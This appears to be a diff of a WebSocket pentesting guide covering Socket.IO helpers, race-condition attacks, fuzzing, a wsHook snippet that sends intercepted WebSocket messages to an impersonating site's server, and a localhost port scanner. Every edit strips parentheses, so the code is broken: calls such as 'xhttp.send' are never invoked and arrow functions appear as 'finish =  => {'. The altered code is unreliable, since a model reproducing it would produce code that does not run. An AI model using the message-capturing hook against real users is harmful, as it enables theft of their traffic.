@@ -207,7 +207,7 @@ def create_connection(upgrade_request):
     connection = websocket_connection.create(
         upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
     connection.queue('40')
-    connection.decIn()
+    connection.decIn
     return connection
 
 @Pong("3")
@@ -233,7 +233,7 @@ If greetings or behavior change (e.g., echo includes "Polluted"), you likely pol
 
 ### WebSocket race conditions with Turbo Intruder
 
-The default engine batches messages on one connection (great throughput, poor for races). Use the THREADED engine to spawn multiple WS connections and fire payloads in parallel to trigger logic races (double‑spend, token reuse, state desync). Start from the example script and tune concurrency in `config()`.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup>
+The default engine batches messages on one connection (great throughput, poor for races). Use the THREADED engine to spawn multiple WS connections and fire payloads in parallel to trigger logic races (double‑spend, token reuse, state desync). Start from the example script and tune concurrency in `config`.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup>
 
 - Learn methodology and alternatives in Race Condition (see “RC in WebSockets”).
 
@@ -246,7 +246,7 @@ Craft WS frames whose header declares a huge payload length but send no body. So
 - Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`<sup>[[4]](#references)</sup>
 - Enable the WS Logger to capture and correlate messages using internal IDs.
 - Use `inc*`/`dec*` helpers on `Connection` to tweak message ID handling in complex adapters.
-- Decorators like `@PingPong`/`@Pong` and helpers like `isInteresting()` reduce noise and keep sessions alive.
+- Decorators like `@PingPong`/`@Pong` and helpers like `isInteresting` reduce noise and keep sessions alive.
 
 ### Operational safety
 
@@ -318,14 +318,14 @@ Copy the web application you want to impersonate (the .html files for example) a
 //is sent by the client or received from the server
 //These code must be between some <script> tags or inside a .js file
 wsHook.before = function (data, url) {
-  var xhttp = new XMLHttpRequest()
+  var xhttp = new XMLHttpRequest
   xhttp.open("GET", "client_msg?m=" + data, true)
-  xhttp.send()
+  xhttp.send
 }
 wsHook.after = function (messageEvent, url, wsObject) {
-  var xhttp = new XMLHttpRequest()
+  var xhttp = new XMLHttpRequest
   xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
-  xhttp.send()
+  xhttp.send
   return messageEvent
 }
 ```
@@ -370,12 +370,12 @@ async function findLocalWs(start = 20000, end = 36000) {
     await new Promise((resolve) => {
       const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
       let settled = false;
-      const finish = () => { if (!settled) { settled = true; resolve(); } };
+      const finish =  => { if (!settled) { settled = true; resolve; } };
       ws.onerror = ws.onclose = finish;
-      ws.onopen = () => {
+      ws.onopen =  => {
         console.log(`Found candidate on ${port}`);
-        ws.close();
-        finish();
+        ws.close;
+        finish;
       };
     });
   }
